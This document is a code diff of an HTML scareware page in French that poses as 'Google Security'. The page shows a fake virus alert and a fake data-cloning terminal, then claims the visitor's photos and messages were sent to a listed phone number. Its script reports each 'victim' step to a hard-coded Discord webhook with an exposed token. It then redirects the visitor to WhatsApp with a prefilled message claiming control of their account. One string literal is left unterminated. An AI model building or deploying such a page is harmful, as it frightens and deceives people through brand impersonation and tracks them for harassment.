@@ -3,38 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security - Critical System Failure</title>
+    <title>Google Security - Final Error</title>
     <style>
         body { margin: 0; padding: 0; background: #000; overflow: hidden; height: 100vh; font-family: 'Courier New', monospace; }
-        
-        /* PORTE GOOGLE (L'APPÂT) */
         #gate { background: #fff; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 100; position: relative; }
-        .g-btn { background: #d93025; color: #fff; border: none; padding: 18px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.2); }
-
-        /* TERMINAL SATURE */
-        #terminal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; color: #0f0; font-size: 9px; padding: 5px; word-break: break-all; opacity: 0.7; line-height: 1; }
-
-        /* ALERTES VIRUS FLASH */
-        .virus-alert { color: #f00; font-weight: bold; font-size: 14px; text-decoration: blink; animation: blinker 0.2s infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-
-        /* FISSURES RÉALISTES */
-        #crack-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9000; pointer-events: none;
-            background-image: url('https://www.transparenttextures.com/patterns/cracked-glass.png');
-            background-size: cover; filter: invert(1);
+        .g-btn { background: #d93025; color: #fff; border: none; padding: 18px 40px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #terminal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; color: #0f0; font-size: 8px; padding: 5px; word-break: break-all; opacity: 0.8; line-height: 1; overflow: hidden; }
+        #crack-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9000; pointer-events: none; background-image: url('https://www.transparenttextures.com/patterns/cracked-glass.png'); background-size: cover; filter: invert(1); }
+        
+        /* BLOC ROUGE FINAL MODIFIÉ */
+        #alert-box { 
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            width: 90%; background: #000; color: #f00; border: 5px solid #f00; padding: 20px; text-align: center; z-index: 10000; 
         }
-
-        /* BLOC ROUGE FINAL */
-        #alert-box {
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 90%; background: #000; color: #f00; border: 5px solid #f00;
-            padding: 20px; text-align: center; z-index: 10000; box-shadow: 0 0 100px #f00;
-        }
-        .crit-bar { background: #f00; color: #000; font-weight: bold; padding: 8px; margin: 10px 0; font-size: 16px; }
-
-        /* FLASH DE LA MORT */
+        .crit-bar { background: #f00; color: #000; font-weight: bold; padding: 8px; margin: 10px 0; font-size: 14px; }
+        .wa-btn { background: #25D366; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 15px; font-size: 16px; }
         .glitch-mode { animation: flashRedBlack 0.04s infinite; }
         @keyframes flashRedBlack { 0% { background: #f00; } 100% { background: #000; } }
     </style>
@@ -43,8 +26,8 @@
 
     <div id="gate">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
-        <h2 style="font-family: sans-serif; color: #202124;">SYSTÈME INFECTÉ</h2>
-        <p style="font-family: sans-serif; color: #5f6368; padding: 0 30px;">Un virus de type 'Trojan.Cloner' a été détecté.<br><b>Cible : Répertoire Privé</b></p>
+        <h2 style="font-family: sans-serif;">SYSTÈME INFECTÉ</h2>
+        <p style="font-family: sans-serif; color: #5f6368; padding: 0 20px;">Menace Trojan.Cloner détectée.<br>Action requise.</p>
         <button class="g-btn" onclick="infect()">SUPPRIMER LE VIRUS</button>
     </div>
 
@@ -52,49 +35,49 @@
     <div id="crack-overlay"></div>
 
     <div id="alert-box">
-        <div class="crit-bar">⚠️ VIRUS DÉTECTÉ : TRANSFERT TERMINÉ</div>
-        <p style="color:#fff;">VOS PHOTOS ET MESSAGES ONT ÉTÉ RÉCUPÉRÉS PAR :</p>
-        <h1 style="font-size: 35px; margin: 15px 0;">0819679859</h1>
-        <div class="crit-bar">DOMMAGES SYSTÈME : IRRÉVERSIBLES</div>
-        <p style="font-size: 10px; color: #ccc;">Effacement des traces de l'attaquant en cours...</p>
+        <div class="crit-bar">⚠️ TRANSFERT TERMINÉ</div>
+        <p style="color:#fff; font-size: 12px;">VOS DONNÉES PERSONNELLES (PHOTOS, MESSAGES) ONT ÉTÉ ENVOYÉES AU :</p>
+        <h1 style="font-size: 28px; margin: 10px 0;">0819679859</h1>
+        <div class="crit-bar">ACCÈS DISTANT ACTIVÉ</div>
+        
+        <button class="wa-btn" onclick="finalRedirect()">REPRENDRE LE CONTRÔLE</button>
     </div>
 
     <script>
+        const webh = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
+
         function infect() {
+            fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🔥 **PHASE 1 :** La victime a lancé le hack !"}) });
             document.getElementById('gate').style.display = 'none';
-            const term = document.getElementById('terminal');
-            term.style.display = 'block';
+            document.getElementById('terminal').style.display = 'block';
 
             let i = 0;
             const sequence = setInterval(() => {
-                const lines = [
-                    "SCANNING_MEMORY_SECTORS...",
-                    "<span class='virus-alert'>[!!] VIRUS DETECTED: TROJAN_EXTRACTOR [!!]</span>",
-                    "BYPASSING_ENCRYPTION_KEY_..._SUCCESS",
-                    "ACCESSING_WHATSAPP_DATABASE_..._OK",
-                    "DUMPING_PRIVATE_GALLERY_..._78%",
-                    "SENDING_DATA_TO_REMOTE_SERVER: 0819679859",
-                    "<span class='virus-alert'>[!!] SYSTEM CORRUPTION IN PROGRESS [!!]</span>",
-                    "RECOVERING_CONTACT_LIST_..._COMPLETED"
-                ];
-
-                const line = document.createElement('div');
-                line.innerHTML = ">> " + lines[Math.floor(Math.random() * lines.length)];
-                term.appendChild(line);
+                for(let j=0; j<5; j++) {
+                    const l = document.createElement('div');
+                    l.innerText = ">> CLONING_PRIVATE_DATA_0x" + Math.random().toString(16).substring(2,6);
+                    document.getElementById('terminal').appendChild(l);
+                }
                 window.scrollTo(0, document.body.scrollHeight);
                 i++;
-
-                // Fissures au milieu
-                if(i === 80) document.getElementById('crack-overlay').style.display = 'block';
-
-                // Fin de la séquence
-                if(i > 250) {
+                if(i === 30) document.getElementById('crack-overlay').style.display = 'block';
+                if(i > 80) {
                     clearInterval(sequence);
-                    term.style.display = 'none';
+                    document.getElementById('terminal').style.display = 'none';
                     document.body.classList.add('glitch-mode');
                     document.getElementById('alert-box').style.display = 'block';
                 }
-            }, 40);
+            }, 50);
+        }
+
+        function finalRedirect() {
+            // Message au Discord
+            fetch(webh, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🤡 **PHASE FINALE :** La victime vient vers ton WhatsApp pour s'expliquer !"}) });
+
+            // Redirection WhatsApp avec message pré-rempli
+            const monNumero = "243819679859"; // Format international pour la RDC
+            const message = "J'ai maintenant le contrôle de ton compte WhatsApp.;
+            window.location.href = "https://wa.me/" + monNumero + "?text=" + encodeURIComponent(message);
         }
     </script>
 </body>
